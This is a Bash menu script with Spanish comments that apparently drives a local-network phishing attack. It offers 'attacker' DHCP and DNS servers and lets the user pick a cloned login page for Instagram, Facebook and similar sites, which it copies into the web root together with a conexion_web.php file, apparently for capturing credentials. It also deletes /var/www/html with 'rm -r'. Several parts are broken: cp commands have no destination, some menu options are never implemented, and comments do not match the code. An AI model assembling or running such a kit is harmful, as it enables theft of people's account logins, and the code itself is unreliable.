#!/bin/bash
clear
echo "1. Elegir página web"
echo "2. Iniciar/Parar servidor DHCP. (Atacante)"
echo "3. Iniciar/Parar servidor DNS. (Atacante)"
echo "4. Iniciar/Parar servidor web. (Apache)"
echo "5. Analisis de red."
echo "6. Desintalar uno o varios paquetes."
echo "7. Salir."
read -p "Seleccione una opcion: " opcion
#---------------------------------------------------------------------------------------------------------------------
# Si el numero es 1 se inicia/para la base de datos.
#variable página_web
pagina_web=0
if [ $opcion -eq 1 ]; then
    echo "[1]. Instagram    [2]. Facebook    [3]. Twitter"
    echo "[4]. Youtube      [5]. Wikipedia   [6]. Google"
    echo "[7]. LinkedIn    [8]. Google       [9]. StackOverflow"
    echo "[10]. GitHub     [11]. Reddit      [12]. Pinterest"
    #Magenta
    echo -e "\e[35m"
    read -p "Seleccione una opcion: " opcion
    echo -e "\e[0m"

    #Si la opción es del 1 al 12, comprueba que el archivo conexion_web.php está en /var/www/html/
    #Si está no se hace nada, si NO está se copia a /var/html/www/
    if [ $opcion -eq 1 ]; then
        #Instagram
        #Eliminar el contenido de html.
        rm -r /var/www/html
        #Añadir el contenido de la página.
        cp webs/instagram/html
    fi

    #Facebook
    if [ $opcion -eq 2 ]; then
        #Eliminar el contenido de html.
        rm -r /var/www/html
        #Añadir el contenido de la página.
        cp webs/facebook/html
    fi

    if [ $opcion -ge 1 ] && [ $opcion -le 12 ]; then
        if [ -f /var/www/html/conexion_web.php ]; then
            echo -e "\e[32m El archivo conexion_web.php ya existe. \e[0m"
        else
            #En rojo.
            echo -e "\e[31m El archivo conexion_web.php no existe. \e[0m"
            echo -e "\e[35m Copiando archivo conexion_web.php a /var/www/html/ \e[0m"
            cp webs/conexion_web.php /var/www/html/conexion_web.php
            echo -e "\e[35m Archivo copiado. \e[0m"
        fi
    fi
fi

# Si el numero es 4, se inicia el servidor web.
if [ $opcion -eq 4 ]; then
    ./apache.sh
fi

# Si el numero es 5, se inicia el analisis de red.
if [ $opcion -eq 5 ]; then
    ./analisis.sh
fi

# Si el numero es 6, se desinstala uno o varios paquetes.
if [ $opcion -eq 6 ]; then
    ./desinstalar.sh
fi